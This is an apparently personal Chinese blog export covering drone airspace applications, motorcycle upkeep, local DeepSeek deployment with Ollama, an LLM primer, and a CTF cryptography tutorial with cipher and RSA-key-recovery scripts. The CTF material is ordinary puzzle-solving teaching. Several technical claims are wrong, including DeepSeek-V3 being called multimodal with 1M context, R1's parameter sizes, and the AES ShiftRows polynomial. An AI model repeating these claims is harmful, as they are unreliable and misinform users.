[{"title":"【无人机】萌新UOM申请空域指南（失败档案）","path":"//drone/apply_for_airspace.html","content":"申请多次但是尚未成功，教程信息来自飞手老师。 本文无广告，请放心浏览。 笔者默认您已经 拥有无人机以及 UOM 账号 无人机已经在 UOM 实名登记 拥有 UOM 合格证 UOM官网https://uom.caac.gov.cn/#/main 大疆限飞地图https://fly-safe.dji.com/nfz/nfz-query 1. 添加“我的航空器”流程【运行管理】-【我的航空器】-【同步我登记的航空器】 2. 添加“我的操作员”流程【运行管理】-【我的操作员】-【同步我登记的操作员】 3. 申请空域流程【运行管理】-【飞行活动申请】-【一般飞行活动】-【新增】 申请内容1. 飞行活动申请信息 选项 内容 任务性质 个人娱乐 操控模式 自主飞行 飞行模式 视距内飞行 预计开始时间 （中午 12 点前可申请明天，中午 12 点后只能申请后天） 预计结束时间 （只能在【预计开始时间】当天） 最大飞行高度（米） 50 （或者 80） 通信联络方法 （本人姓名+电话） 起降备降场地 起降地点在【起飞点】空地，现场有专人管理。 应急处置程序 真高飞行高度飞行不超过 【最大飞行高度（米）】m，全程为持有 UOM 合格证【姓名】操作，当无人机出现特殊情况时，将手动返航【起飞点】空地。 特殊飞行保障需求 无 通信、导航和被监视能力 无 飞行速度和进出空域方法 全程可视范围内飞行操作，真高不超过【最大飞行高度（米）】m。因为航拍需求，飞行速度为低速飞行。 指挥控制链路无线电频率以及占用带宽 无 二次雷达应答机或有关自动监视设备代码 无 其他必要信息 无 是否涉及以下活动 不涉及以上活动 附件上传 （无） 2. 航空器信息 3. 操控员信息 4. 飞行空域信息选择多边形，然后在右边找到需要拍摄的区域，在飞行区域的边框点击（最后一个点要点回起始点，形成封闭区域），然后点击确认。 5. 完成申请 申请结果 更新自 2025.10.16 申请多次但是尚未成功，教程信息来自飞手老师。 参考 GitHub Pages 搭建的博客绑定域名","tags":["无人机","UOM","申请空域"],"categories":["无人机"]},{"title":"【Motor】DL250保养信息","path":"//motor/DL250/1.html","content":"【腾讯文档】DL250群友装备分享 1. 发动机机油+机滤 日期 里程数 机油详情 更换容量 是否更换机滤 价格 2025.03.22 1000km 豪爵黄瓶 10w-40 1.0L+1.2L 是 160 元 2025.05.31 3610km 豪爵蓝罐 10w-50 1.0L+1.2L 是 185 元 2025.10.22 10850km 豪爵黄瓶 10w-50 1.0L+1.2L 是 197 元 2. 链条保养 日期 里程数 是否清洗链条 是否上链条蜡 2025.05.18 3200km 是 是 2025.05.31 3610km 否 是 2025.06.12 4060km 否 是 （不超过 3 次）… … … … 2025.09.12 8000km+ 是 是 2025.10.16 10200km+ 是 是 2025.11.05 11600km+ 否 否 （两个否: 只用了链条油） 3. 头盔保养 日期 清洗方式 2025.05.28 拆内衬机洗 4. 油耗记录（太多了不是手打的，小熊油耗导出的） 日期 总里程（公里） 单价（元升） 加油量（升） 金额（元） 油耗 （升百公里） 2025-03-07 3 7.54 15.06 113.55 3.31 2025-03-12 388 7.54 12.74 96.05 3.26 2025-03-19 744 7.54 11.60 87.46 3.09 2025-03-23 1178 7.32 13.43 98.30 3.08 2025-03-30 1634 7.32 14.04 102.77 3.24 2025-04-08 2030 7.07 12.84 90.83 3.16 2025-04-29 2450 6.78 13.27 89.97 3.32 2025-05-16 2866 7.12 13.81 98.32 3.41 2025-05-26 3254 6.93 13.24 91.75 2.95 2025-06-02 3615 7.51 10.66 80.05 3.70 2025-06-09 4003 6.41 14.37 92.07 3.54 2025-06-23 4380 6.72 13.34 89.66 3.56 2025-08-12 4759 6.90 13.51 93.26 3.54 2025-08-16 5125 6.88 12.97 89.24 3.65 2025-08-25 5509 6.88 14.00 96.33 3.59 2025-08-30 5869 6.73 12.94 87.09 3.63 2025-09-02 6235 6.73 13.28 89.38 3.46 2025-09-05 6616 6.73 13.17 88.64 3.73 2025-09-09 6991 7.00 2.81 19.66 3.73 2025-09-09 7063 6.73 13.85 93.22 3.59 2025-09-13 7448 6.65 13.83 91.97 3.44 2025-09-16 7826 6.73 13.01 87.57 3.47 2025-09-18 8182 6.70 12.34 82.68 3.57 2025-09-22 8553 6.73 13.24 89.11 3.37 2025-10-03 8970 6.73 14.04 94.44 3.95 2025-10-07 9300 6.70 13.05 87.39 3.54 2025-10-10 9674 6.66 13.23 88.06 3.41 2025-10-14 10054 6.67 12.97 86.50 -1.00","tags":["摩托车","DL250","保养时间"],"categories":["摩托车"]},{"title":"【大模型】Linux私有化部署大模型：DeepSeek大模型实战","path":"//model/3.html","content":"1. VMware Workstation Pro 介绍1.1 VMware Workstation Pro 简介VMware Workstation Pro 是一款由 VMware 开发的行业标准桌面虚拟化软件，允许用户在单台物理计算机上同时运行多个操作系统（如 Windows、Linux、macOS 等），为开发、测试及部署应用程序提供隔离的虚拟环境。 虚拟化技术原理VMware Workstation Pro 基于 硬件虚拟化技术，通过 Hypervisor（虚拟机监控器）​ 抽象物理机的 CPU、内存、存储等资源，分配给多个虚拟机（VM），每个 VM 可独立运行不同操作系统和应用程序。其核心技术包括： CPU 虚拟化：利用 Intel VT-xAMD-V 硬件辅助技术，将物理 CPU 资源动态分配给虚拟机，确保多系统并行运行时的性能隔离。 内存虚拟化：通过分页和动态分配技术，实现虚拟机内存的高效利用。 I/O 虚拟化：模拟虚拟设备（如网卡、硬盘），支持虚拟机与外部网络的交互。 多系统兼容性 支持 Windows 11Server 2022、Ubuntu 24.04、macOS（需特殊配置）等主流系统。 可运行 32 核 CPU、128 GB 内存的虚拟机，满足高性能计算需求。 快照管理 创建多个时间点的系统快照，支持一键恢复或跨快照版本提取数据。 内存分配原则： 单虚拟机内存建议不超过宿主机物理内存的 70%。 AI 开发场景中，为训练任务分配更多资源（如 8-12 GB），轻量级测试环境可缩减至 2-4 GB。 1.2 安装教程 VMware Workstation Pro 安装包 安装流程 2. VMware Workstation Pro 安装 Ubuntu2.1 Ubuntu 介绍Ubuntu 是一款基于 Linux 内核的免费开源操作系统，由 Canonical 公司主导开发，以用户友好性、稳定性和强大的社区生态著称，支持桌面、服务器及云计算等多场景应用，其命名源自非洲哲学“人道待人”的协作精神。 Ubuntu 版本对比 稳定性与长期支持 LTS 版本（如 Ubuntu 22.0424.04）经过严格测试，默认不升级核心组件（如 GNOME 桌面），专注于安全补丁和硬件支持更新，提供 5 年基础维护，通过 Ubuntu Pro 可延长至 12 年。适用于企业服务器、生产环境及对稳定性要求高的场景。 新版特性支持（如 Ubuntu 25.04）​ 前沿功能与性能优化新版默认启用 NVIDIA Dynamic Boost 动态调配 CPUGPU 功耗，提升图形密集型任务性能；搭载 Linux 6.14 内核优化硬件兼容性，GNOME 48 桌面增强动画和窗口管理，工具链（PythonGoRust）升级加速应用加载。 短期维护与风险普通版本每 6 个月发布一次，提供最新软件（如 GNOME 桌面升级），但维护周期仅 9 个月，需频繁升级且稳定性风险较高，适合开发者或实验性需求。 选择建议 企业/服务器场景：优先选择 LTS 版本，如 24.04 LTS（支持 12 年维护、云服务集成）。 开发/个人尝鲜：选择新版（如 25.04），利用 Dynamic Boost、GNOME 48 等特性。 虚拟机资源配置建议 处理器（CPU）分配 核心数原则：虚拟机分配的 CPU 核心数建议不超过物理机逻辑核心数的 50%​（例如物理机 8 核，虚拟机分配 2-4 核）。 轻量级任务 ​（如命令行测试）：2 核即可满足需求。 计算密集型任务 ​（如编译、数据库服务）：建议分配 4 核以上，并启用超线程（Hyper-Threading）优化多线程性能。 内存（RAM）分配 基本需求：Ubuntu 桌面版建议 4GB 以上内存，服务器版可降至 2GB​（但需关闭图形界面）。 开发或服务器场景 ​（如运行 Docker、IDE）：建议 8GB 以上，避免频繁交换内存影响性能。 2.2 安装教程ISO 镜像下载，参考教程 3. Ubuntu 部署 Ollama3.1 通过官方脚本快速安装需联网 curl -fsSL https://ollama.com/install.sh | sh 若网络问题导致失败，可手动下载 Linux 版本并解压安装。 3.2 手动安装 Ollama3.2.1 下载或拷贝到 Ubuntucurl -L https://ollama.com/download/ollama-linux-amd64.tgz -o ollama-linux-amd64.tgz2 3.2.2 在该文件夹中打开终端，解压到usr 目录sudo tar -C /usr -xzf ollama-linux-amd64.tgz 3.2.3 开启程序ollama serve 3.2.4 下载模型并且使用ollama run deepseek-r1:1.5b 课后作业安装 VMware Workstation Pro，然后安装系统 Ubuntu，部署 deepseek-r1:1.5b","tags":["大模型","Linux部署大模型"],"categories":["大模型"]},{"title":"【大模型】Windows私有化部署大模型：利用Ollama和Chatbox构建本地大模型交互平台","path":"//model/2.html","content":"1. Ollama 介绍1.1 Ollama 的核心功能Ollama 是一款专为本地化运行大型语言模型（LLM）设计的开源工具，通过简化的命令行操作和 API 接口，让用户无需复杂配置即可在个人电脑上部署和运行各类开源大模型。 1.1.1 一键部署模型 支持通过 ollama run 模型名命令直接拉取并运行模型（如 qwen、DeepSeek 等），自动处理模型下载、格式转换和环境适配。 内置模型仓库（Model Hub）：提供数百个预量化模型，覆盖 7B 到 70B 参数规模。 1.1.2 本地化运行 完全离线运行，无需网络连接，数据隐私性高。 支持 CPU/GPU 混合计算（通过 Metal、CUDA 或 OpenCL 加速），显存不足时可自动切换到内存运行。 1.1.3 开发者友好接口 提供 REST API（默认端口 11434），轻松与第三方应用（如 Chatbox、Dify）集成。 支持 PythonJavaScript 等语言的 SDK，便于二次开发。 import ollama# 流式输出def api_generate(text:str): # print(f提问：text) stream = ollama.generate( stream=True, model=deepseek-r1:7b, prompt=text, ) print(-----------------------------------------) for chunk in stream: if not chunk[done]: print(chunk[response], end=, flush=True) else: print( ) print(-----------------------------------------) print(f总耗时：chunk[total_duration]) print(-----------------------------------------)if **name** == **main**: # 流式输出api_generate(text=f帮我写一个冒泡排序) # 非流式输出 content = ollama.chat(model=deepseek-r1:7b,stream=False,messages=[role: user,content: 帮我写一个冒泡排序],options=temperature:0) print(content) 1.2 Ollama 的技术优势1.2.1 模型轻量化 采用 GGUF 量化技术（如 Q4、Q5、Q8），在保持模型精度的同时显著降低资源占用： 7B 模型仅需 4-6GB 内存显存 13B 模型占用 8-10GB 70B 模型需 32GB 以上（需高端显卡） 1.2.2 跨平台兼容性 支持 WindowsmacOSLinux 系统 自动适配 NVIDIAAMDApple Silicon 芯片 1.2.3 灵活扩展性 支持自定义模型（通过 Modelfile 定义参数、提示词模板） 可导入 HuggingFace、PyTorch 等开源模型格式 1.3 Ollama 支持的主流模型 模型类型 代表模型 典型用途 通用对话 Llama3、DeepSeek R1、Mistral 问答、写作、编程 代码生成 CodeLlama、StarCoder 代码补全、算法实现 多模态 LLaVA、Bakllava 图像理解、图文问答 垂直领域 Meditron（医疗）、FinGPT 专业领域知识处理 2. Chatbox 介绍Chatbox 是一款开源免费的 AI 对话客户端，专为本地或云端大语言模型（LLM）提供可视化交互界面。它支持与 Ollama、OpenAI、Claude 等模型 API 无缝对接，尤其适合需要隐私保护或离线运行 AI 的用户。 2.1 核心功能亮点2.1.1 零代码可视化操作 提供简洁的聊天式界面，无需编程基础即可与本地模型对话（如 DeepSeek、Llama3）。 支持 Markdown 渲染，代码高亮显示，对话历史自动保存。 2.1.2 多模型兼容性 支持 Ollama 本地 API，也兼容 OpenAI、Anthropic 等云端服务。 可同时管理多个模型账户，一键切换不同 AI 角色。 2.1.3 隐私与安全 数据完全本地存储，对话记录不经过第三方服务器。 支持敏感内容过滤和自定义安全策略（如禁用某些话题）。 2.1.4 高级功能 预设提示词库：内置常用提示词模板（如翻译、写作助手、代码生成等），支持自定义模板。 快捷指令：可设置快捷键快速触发常用操作。 调试模式：开发者可通过调试面板查看 API 请求与响应的原始数据。 系统提示词：自定义系统级提示词，调整 AI 的行为模式。 2.2 与同类工具对比 特性 ChatBox LobeChat Open WebUI 核心定位 轻量本地客户端 多功能跨平台助手 自托管 Web UI（类 ChatGPT 界面） 部署方式 桌面安装 Web桌面移动端 需自托管（Docker本地服务器） 开源免费 ✅ 开源免费 ✅ 开源免费 ✅ 开源免费 隐私控制 本地存储（无需网络） 可选本地云端 自托管（完全控制数据） 内置模型支持 ❌ 需自备 API ✅ 多模型直接使用 ❌ 需自备 API 或本地模型 多会话管理 标签页式 文件夹分类 线性对话历史 插件生态 基础插件 ✅ 丰富插件 有限（依赖社区扩展） 团队协作 ❌ 个人 ✅ 团队共享 ❌ 个人或单用户 移动端支持 ❌ 无 ✅ PWA响应式 Web ✅ 通过浏览器访问 开发者工具 ✅ 调试模式API 日志 ❌ 普通用户导向 ✅ 高级模型参数配置 自托管复杂度 ❌ 无需托管 ❌ 无需托管 ✅ 需技术部署（适合极客企业） 特色功能 系统级提示词快捷键 知识库检索AI 画图 本地模型集成高自由度 UI 定制 总结选择建议 ChatBox：适合开发者隐私敏感用户，轻量本地化，快速调试提示词。 LobeChat：适合普通用户团队协作，开箱即用多模型，功能丰富易扩展。 Open WebUI：适合自托管需求者企业，完全控制数据，兼容本地 AI 模型（如 Llama3）。 3. 部署 DeepSeek R1 7B 模型（基于 Ollama）3.1 安装 Ollama Windows：访问 Ollama 官网，下载对应系统的安装包，双击运行并完成安装。 验证安装：打开终端（或者 cmd），输入命令 ollama -v，若显示版本号则安装成功。 Linux：执行命令一键安装： curl -fsSL https://ollama.com/install.sh | sudo bashsudo systemctl start ollama 3.2 下载 DeepSeek R1 7B 模型 在终端输入以下命令拉取模型： ollama run deepseek-r1:7b 进度查看：终端会显示下载进度条，出现 Success 即表示完成。 3.3 验证模型运行 下载完成后，终端会自动进入交互模式，输入测试问题（如“9.8 和 9.11 哪个更大？”），若模型返回逻辑清晰的回答，则部署成功。 3.4 （可选）自定义配置 修改模型存储路径（避免占用 C 盘）：Windows：在终端执行 setx OLLAMA_MODELS D:\\OllamaModels，重启生效。 4. 安装 Chatbox 实现可视化界面4.1 下载 Chatbox 客户端 访问 Chatbox 官网，下载对应系统的安装包并完成安装。 4.2 配置 Chatbox 连接 Ollama 打开 Chatbox，点击“使用自己的 API Key 或本地模型”。 在模型提供方中选择“Ollama API”。 填写 API 地址：默认端口（http://localhost:11434）。 在模型选择中勾选 deepseek-r1:7b，点击保存。 4.3 开始对话 返回主界面，输入问题（如“用 Python 写快速排序”），Chatbox 会通过本地模型生成回答。 课后作业在自己的电脑上面部署 Ollama + DeepSeek + Chatbox。","tags":["大模型","Windows部署大模型"],"categories":["大模型"]},{"title":"【大模型】大模型科普：从历史演进到技术前沿","path":"//model/1.html","content":"1. 基础概念 人工智能（Artificial Intelligence, AI）​是计算机科学的分支，旨在通过模拟、延伸和扩展人类智能，使机器具备学习、推理、决策等能力的一门技术科学。其核心目标是使计算机能够执行需人类智能才能完成的任务，如语言理解、图像识别、复杂推理等。 大模型（Large Model）​指参数规模庞大（通常达数十亿至万亿级，十亿就是大模型）、基于深度学习技术的人工智能模型，能够处理复杂任务并具备多领域泛化能力。其核心特点包括海量参数、大规模数据训练和高算力需求。 开源（Open Source）​指软件或模型的源代码、训练方法、权重参数等核心技术细节向公众开放，允许任何人自由查看、使用、修改和分发。在大模型领域，开源模式打破了技术垄断，降低企业研发门槛。 B（Billion，十亿）​在大模型领域，​B 是参数规模的常用计量单位，表示 十亿级参数数量。例如： 7B 模型代表 70 亿参数​。 14B 模型代表 140 亿参数​。 175B 模型代表 1750 亿参数​。 参数规模越大，模型理论上能存储的“知识”越丰富，处理复杂任务的泛化能力越强。例如，GPT-4 的 1.8 万亿参数使其能理解反讽、逻辑推理等抽象语义。 Token（词元）​是人工智能模型处理文本的最小语义单元，相当于语言的“积木”。它将文本拆解为可计算的基本单位，可以是单个汉字、词语、标点符号或子词（如英文单词的一部分）。示例： 中文：“我爱 AI！” → 拆分为「我」「爱」「AI」「！」（4 个 Token）。 英文：“unbelievable” → 拆分为「un」「belie」「vable」（3 个 Token）。 预训练（Pre-training）​在大规模无标注数据（如互联网文本）上训练模型，学习通用语言或视觉规律，例如 GPT-3 使用 45TB 文本数据预训练。 微调（Fine-tuning）​在预训练基础上，用特定领域的小规模标注数据进一步训练，使模型适配具体任务（如医疗问答）。 混合专家系统（MoE）​将大模型拆分为多个“专家子网络”，推理时仅激活部分专家，降低计算成本的同时提升模型容量，例如 DeepSeek 通过 MoE 将推理效率提升 5 倍。 多模态（Multimodal）​支持同时处理文本、图像、音频等多种数据类型的模型，例如 Qwen-VL 可联合分析文本、图表和图片。 RAG（检索增强生成）​结合外部知识库提升回答准确性，解决模型“幻觉”问题，例如医疗领域结合专业文献生成诊断建议。 2. 起源：神经网络的启蒙（1940s-1980s）2.1 感知机的诞生与局限（1957）1957 年，弗兰克·罗森布拉特（Frank Rosenblatt）受生物神经元启发，首次在 IBM 计算机上实现了感知机（Perceptron）。这种单层神经网络通过加权输入信号计算输出，能够完成简单的线性分类任务（如识别手写数字）。然而，1969 年马文·明斯基（Marvin Minsky）指出，感知机无法解决异或运算（非线性问题），导致神经网络研究陷入低谷。 2.2 反向传播算法突破（1986）杰弗里·辛顿（Geoffrey Hinton）等学者提出反向传播算法（Backpropagation），通过链式法则逐层调整神经网络权重，首次实现了多层神经网络的训练。这一算法如同“数学导师”，能让网络从错误中学习，为深度学习奠定基础。但受限于算力和数据，此时神经网络仍难以广泛应用。 3. 复兴：深度学习的崛起（2000s-2010s）3.1 算力与数据的双重革命（2006）随着 GPU 算力提升和互联网数据爆炸，辛顿团队提出逐层预训练方法，突破深层网络训练瓶颈。2012 年，AlexNet 在 ImageNet 竞赛中以深度卷积神经网络（CNN）击败传统算法，识别错误率从 26%骤降至 15%，标志着深度学习正式进入主流视野。 3.2 循环神经网络（RNN）的探索为解决序列数据处理难题（如文本、语音），科学家提出RNN及其改进型LSTM，通过“记忆单元”捕捉时间序列的长期依赖关系。但梯度消失问题仍限制其性能，直到 Transformer 架构的出现才彻底改变格局。 4. 质变：大模型时代的开启（2017 至今）4.1 Transformer 架构革命（2017）谷歌团队发布《Attention Is All You Need》论文，提出Transformer架构。其核心多头自注意力机制可并行处理长文本依赖，彻底替代 RNNCNN，成为大模型通用底座。例如，GPT-3 的 1750 亿参数模型即基于 Transformer 堆叠。 4.2 ChatGPT 与多模态突破（2022-2024） ChatGPT（2022）：基于 GPT-3.5 架构，引入人类反馈强化学习（RLHF），首次实现类人对话能力，用户数突破 1 亿仅用 2 个月。 GPT-4（2023）：支持文本与图像多模态输入，逻辑推理能力接近人类。 Sora（2024）：OpenAI 发布视频生成模型，实现 60 秒连贯场景生成，推动世界模型发展。 5. 中国力量：从追赶者到创新者5.1 通义千问（Qwen）：开源生态的“破壁者”​ 开源战略： 发布全量参数模型（如 Qwen-72B），允许企业自由商用，全球开发者已基于 Qwen 训练出超 10 万个垂直领域模型。 推出轻量级版本（如 Qwen-32B），仅需 2 张 RTX 4090 显卡即可部署，让中小企业用得起大模型。 技术亮点： 超长上下文窗口：Qwen2.5-Max 支持100 万 token上下文（约 75 万字），可一次性分析整部《红楼梦》并回答细节问题。 多模态能力：Qwen-VL 模型实现“文、图、表”联合分析，例如输入财报截图，可自动生成数据趋势总结。 5.2 DeepSeek：架构创新的“性价比之王”​ 定位与设计目标 V3：​通用型 NLP 模型，采用混合专家架构（MoE），专注于高效处理多种自然语言任务，如对话生成、多语言翻译、内容创作等。 R1：​推理优先模型，基于强化学习优化架构，专攻复杂逻辑推理任务（如数学证明、代码生成、金融分析），适合科研、算法开发等场景。 架构与参数 V3： 总参数 6710 亿，每次推理仅激活 370 亿参数（约 5.5%），通过动态路由机制选择专家模块，降低计算成本。 支持多模态处理（文本、图像、音频等）和长上下文窗口（最高 1M tokens），适合企业级大规模任务。 R1： 参数规模较小​（15 亿至 700 亿），支持蒸馏版本（如 32B 模型），便于本地化部署。 采用动态门控机制，强化专家调度能力，提升逻辑推理效率。 性能表现 V3：在多语言任务​（83 种语言准确率 88%）、代码生成​（HumanEval 通过率 65.2%）、数学应用​（Cmath 得分 90.7%）表现均衡，接近 GPT-4o 水平。 R1：在逻辑推理领域显著领先，如数学竞赛 AIME 2024 通过率 79.8%（V3 为 68.7%）、MATH-500 测试得分 97.3%（V3 为 89.4%）。 应用场景 V3：适合低成本通用任务（如智能客服、长文档解析）和企业级多模态应用。 R1：专用于科研推理、算法交易、教育工具等需要深度分析的场景。 “满血版”的定义“满血版”特指DeepSeek-V3 的完整参数版本​（671B），即未经过压缩或蒸馏的原始模型，支持千卡级训练和复杂任务处理（如科研计算、长文档分析）。与之对比，R1 的“蒸馏版本”（如 1.5B7B14B）参数规模更小，适合资源受限场景（如边缘设备）。 选型建议 选 V3 满血版：需处理多模态、长文本、高并发任务的企业用户，如金融风控、医疗病历分析。 选 R1：需深度逻辑推理的专业场景，如数学研究、代码生成优化。 混合部署：核心业务用 V3 处理，边缘计算任务用 R1 蒸馏版，平衡成本与性能。 课后作业DeepSeek V3 和 R1 的区别是什么，满血版指哪一个?","tags":["大模型","历史"],"categories":["大模型"]},{"title":"【CTF】CTF赛事中的密码学应用：古典密码至现代算法解析","path":"//CTF/Crypto/1.html","content":"1. 古典密码单表替换单表替换关键特征为：明密文一一对应。解决方法： 暴力破解 词频分析，变异凯撒无法破译。 凯撒密码加密时会将明文中的每个字母（数字不处理）向后移位固定数目（循环移动），作为密文。 输入：ABCDEFGHIJKLMNOPQRSTUVWXYZ偏移量：13输出：NOPQRSTUVWXYZABCDEFGHIJKLM 特定的凯撒密码名称 ROT13：偏移量为 13 Python 解密代码 def Caesar(text, iv, table=ABCDEFGHIJKLMNOPQRSTUVWXYZ): result = # 取出每一位字符 for letter in text: # 判断是否为字母，中文是Unicode字符会判定为字母 if letter.isalpha(): # upper()是table是大写字母 # find()返回字母在table中的索引值，找不到会返回-1，产生混淆 index = table.find(letter.upper()) # 判断字母是否大写，大写则输出大写，小写则输出小写 if letter.isupper(): result += table[(index + iv) % 26] else: result += table[(index + iv) % 26].lower() else: result += letter print(result) return resultCaesar(AaBbCc123, 13) # NnOoPp123for i in range(26): Caesar(AaBbCc123, i) 多表替换加密后字母几乎不再保持原来的频率 Vigenere（维吉尼亚）密码密码字母表 加密过程明文：come greatwall密钥：crypto 首先将密钥填充至与明文长度一致。 明文 c o m e g r e a t w a l l 密钥 c r y p t o c r y p t o c 然后查表 密文：efkt zferrltzn 例题Vigenere密码例题 #include stdio.h#include string.h#include stdlib.hint main() freopen(flag.txt,r,stdin); freopen(flag_encode.txt,w,stdout); char key[] = /*SADLY SAYING! Key is eaten by Monster!*/; int len = strlen(key); char ch; int index = 0; while((ch = getchar()) != EOF) if(ch=ach=z) putchar((ch-a+key[index%len]-a)%26+a); ++index; else if(ch=Ach=Z) putchar((ch-A+key[index%len]-a)%26+A); ++index; else putchar(ch); return 0; Zy daf sjle Wafyyo drvnvdrtv gh dif Crtl nrqfy boe zqm trtwjy kf gnnqr blhawas, ntm bhr gogojt ntm xalsgfn kf gnnqr fgnsleef.luig vy cxwpfJnxwobuqg_O_Cogiqi! 解析Vigenere密码解析 C 文件给出是为了体现这是一个维多利亚密码，一横一竖 if(ch=ach=z) putchar((ch-a+key[index%len]-a)%26+a); ++index;else if(ch=Ach=Z) putchar((ch-A+key[index%len]-a)%26+A); ++index;else putchar(ch); 解密工具 https://www.guballa.de/vigenere-solver https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx 答案 He has made Judges dependent on his Will alone for the tenure of their offices, and the amount and payment of their salaries.flag is afctfWhooooooo_U_Gotcha! 其它类型加密培根密码原理常用的加密表 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 下面这一段内容就是明文 steganography 加密后的内容，正常字体是 A，粗体是 B： To encode a message each letter of the plaintext is replaced by a group offive of the letters ‘A’ or ‘B’. 特点 只有两种字符 每一段的长度为 5 加密内容会有特殊的字体之分，亦或者大小写之分。 工具 http://rumkin.com/tools/cipher/baconian.php 栅栏密码原理把要加密的明文分成 N 个一组，然后把每组的第 1 个字连起来，形成一段无规律的话。 例子明文：THERE IS A CIPHER 去掉空格后变为THEREISACIPHER 分成两栏，两个一组得到TH ER EI SA CI PH ER 先取出第一个字母，再取出第二个字母TEESCPEHRIAIHR 连在一起就是TEESCPEHRIAIHR 上述明文也可以分为 2 栏。7 ACIPHER 组合得到密文TAHCEIRPEHIESR 工具 https://www.qqxiuzi.cn/bianma/zhalanmima.php 2. DES 算法分析基本介绍 输入 64 位 输出 64 位 密钥 64 位（使用其中的 56 位。剩下 8 位丢弃奇偶校验位） Feistel 迭代结构 明文经过 16 轮迭代得到密文。 密文经过类似的 16 轮迭代得到明文。 基本流程 多重 DES 多重 DES 就是使用多个密钥利用 DES 对明文进行多次加密。 使用多重 DES 可以增加密钥量，从而大大提高抵抗对密钥的穷举搜索攻击的能力。已经证明多重 DES 并不等价于使用一个 56 位密钥的单重 DES，常用的为三重 DES。 3. AES 算法分析基本介绍 输入 128 bit 输出 128 bit SPN 网络结构 AES 分组长度只能是 128 位，密钥的长度可以使用 128 位、192 位或 256 位三者中的任意一种。 密钥长度(32 比特字) 分组长度(32 比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 基本流程AES 由四个的阶段组成，未使用 Feistel 结构，解密过程与加密过程并不一致。 字节代换（SubBytes）定义了一个 S 盒用于加密查表，一个逆 S 盒用于解密查表这里的运算均定义在 GF(2^8) 内。 行位移（ShiftRows）使用的模多项式为 x^8+x^4+x^3+1。 列混淆（MixColumns） 轮密钥加（AddRoundKey） 密钥扩展 流程汇总（上面的列混淆的矩阵乘法等号左边的列向量应该在右边。） 加解密全图 4. RSA 算法分析 RSA 是一种非对称加密算法 RSA 算法分为三步： 密钥生成 加密 解密 加密原理 随机生成两个大质数 p 和 q，计算 N = pq 根据欧拉函数，求得 φ(N) = φ(p)φ(q) = (p−1)(q−1) 选择一个小于 φ(N) 的整数 e，使 e 和 φ(N) 互质。 求得 e 关于 φ(N) 的模反元素，命名为 d，有 ed ≡ 1(mod φ(N)) 对 m 进行加密 c ≡ m^e(mod N)，解密 m ≡ c^d(mod N) 字母 含义 p，q 两个大质数 N 模数 φ 欧拉函数 e 和 d 互为模反的两个指数 m 明文 c 密文 (e, N) 公钥 (d, N) 私钥 ≡ 同余符号 两个整数 a，b 若他们除以整数 m 所得的余数相等，则称 a，b 对于与模 m 同余。a ≡ b(mod m)读作 a 同余与 b 模 m。 CTF 中的常见 RSA 题型epq，求 dimport gmpy2p = 473398607161q = 4511491e = 17d = gmpy2.invert(e,(p-1)*(q-1)) # gmpy2.invert(e,φ(N))print(d) ecpq，求 mimport gmpy2from Crypto.Util.number import bytes_to_long,long_to_bytesp =q =e =c =n = p * qphi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)m = pow(c, d, n)print(long_to_bytes(m)) ecpq，求 mimport gmpy2def Decrypt(c, e, p, q): L = (p - 1) * (q - 1) d = gmpy2.invert(e, L) n = p * q m = gmpy2.powmod(c, d, n) flag = str(m) print(flag + flag + )if __name__ == __main__: p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Decrypt(c, e, p, q) cpqdpdq，求 mimport gmpy2from Crypto.Util.number import long_to_bytesp = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852I = gmpy2.invert(q, p)mp = pow(c, dp, p) # 求幂取模运算, mp = c^dp % pmq = pow(c, dq, q) # 求幂取模运算, mq = c^dp % qm = (((mp - mq) * I) % p) * q + mq # 求明文公式# 最后得到十六进制数后有时还要转化为字符串print(hex(m)) # 转为十六进制print(long_to_bytes(m)) # noxCTFW31c0m3_70_Ch1n470wn end，求 p、q（n 非常大，求不出 p、q） 例题：题目给出了 2 个文件，一个是加密的脚本 chall.py、另一个是加密脚本的输出内容 output.txt。 # chall.pyfrom gmpy2 import invertfrom md5 import md5from secret import p,qe = 65537n = p*qphi = (p-1)(q-1)d = invert(e, phi)print(n,e,d)print(Flag: flag%s % md5(str(p + q)).hexdigest()) 解密脚本 # 给出n,e,d, 求 q,pimport randomimport hashlibdef gcd(a, b): if a b: a, b = b, a while b != 0: temp = a % b a = b b = temp return adef getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k //= 2 y = pow(g, k, n) if y != 1 and gcd(y - 1, n) 1: p = gcd(y - 1, n) q = n / p return p, qdef main(): n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309 e = 65537 d = 